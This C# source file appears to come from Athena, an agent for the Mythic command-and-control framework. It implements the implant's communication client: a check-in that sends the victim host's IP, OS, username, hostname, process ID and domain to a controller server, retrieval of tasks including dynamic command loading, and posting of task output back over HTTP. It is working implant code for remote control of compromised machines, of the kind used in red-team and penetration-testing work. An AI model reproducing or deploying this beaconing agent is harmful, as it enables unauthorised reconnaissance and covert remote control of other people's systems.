using Athena.Mythic.Hooks;
using Athena.Config;
using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Athena.Mythic.Model.Checkin;
using System.Net;
using System.Diagnostics;
using Athena.Utilities;
using System.Net.Http;
using Newtonsoft.Json;
using Athena.Mythic.Model;
using Athena.Mythic.Model.Response;
using Athena.Commands.Model;

namespace Athena
{
    public class MythicClient
    {
        public MythicConfig MythicConfig { get; set; }
        public MythicClient(MythicConfig conf)
        {
            this.MythicConfig = conf;
        }

        public CheckinResponse CheckIn()
        {
            Checkin ct = new Checkin()
            {
                action = "checkin",
                ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString(),
                os = Environment.OSVersion.ToString(),
                user = Environment.UserName,
                host = Dns.GetHostName(),
                pid = Process.GetCurrentProcess().Id.ToString(),
                uuid = this.MythicConfig.uuid,
                architecture = Misc.GetArch(),
                domain = Environment.UserDomainName,
            };
            var responseString = Send(ct).Result;
            Console.WriteLine(responseString);
            try
            {
                
                CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(responseString);
                if(cs == null)
                {
                    cs = new CheckinResponse()
                    {
                        status = "failed",

                    };
                }
                return cs;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return new CheckinResponse();
            }
        }

        public List<MythicTask> GetTasks()
        {
            GetTasking gt = new GetTasking()
            {
                action = "get_tasking",
                tasking_size = -1,

            };
            try
            {
                var responseString = Send(gt).Result;
                GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
                return gtr.tasks;
            }
            catch
            {
                return null;
            }
        }

        public bool PostResponse(Dictionary<string,MythicJob> jobs)
        {
            List<ResponseResult> lrr = new List<ResponseResult>();
            foreach(var job in jobs.Values)
            {
                if (job.errored)
                {
                    ResponseResult rr = new ResponseResult()
                    {
                        task_id = job.task.id,
                        status = "error",
                        completed = true,
                        user_output = job.taskresult
                    };
                    lrr.Add(rr);
                }
                else if(job.complete)
                {
                    if(job.task.command == "load")
                    {
                        LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
                        CommandsResponse cr = new CommandsResponse()
                        {
                            action = "add",
                            cmd = lc.name,
                        };
                        LoadCommandResponseResult rr = new LoadCommandResponseResult()
                        {
                            task_id = job.task.id,
                            completed = true,
                            user_output = job.taskresult,
                            commands = new List<CommandsResponse>() { cr }
                        };
                        lrr.Add(rr);
                    }
                    else
                    {
                        ResponseResult rr = new ResponseResult()
                        {
                            task_id = job.task.id,
                            completed = true,
                            user_output = job.taskresult,
                            status = "complete"
                        };
                        lrr.Add(rr);
                    }
                }
                else
                {
                    ResponseResult rr = new ResponseResult()
                    {
                        task_id = job.task.id,
                        //completed = "false",
                        user_output = job.taskresult,
                        status = "processed"
                    };
                    lrr.Add(rr);
                }
            }

            PostResponseResponse prr = new PostResponseResponse()
            {
                action = "post_response",
                responses = lrr
            };

            try
            {
                var responseString = Send(prr).Result;
                Console.WriteLine("Response: " + Misc.Base64Decode(responseString).Substring(36));
                PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(Misc.Base64Decode(responseString));
                if (cs.responses.Count < 1 || cs.responses[0].status != "success")
                {
                    return false;
                }
            }
            catch
            {
                return false;
            }

            return true;
        }
        private async Task<string> SendGET(string url)
        {
            try
            {
                var response = await Globals.client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
                return await response.Content.ReadAsStringAsync();
            }
            catch
            {
                return "";
            }
        }

        public async Task<string> Send(object message)
        {
            bool http = true;
            bool websocket = false;

            if (http)
            {
                return await this.MythicConfig.httpConfig.Send(message);
            }
            else if (websocket)
            {
                return "";
            }
            else return "";
        }
    }
}
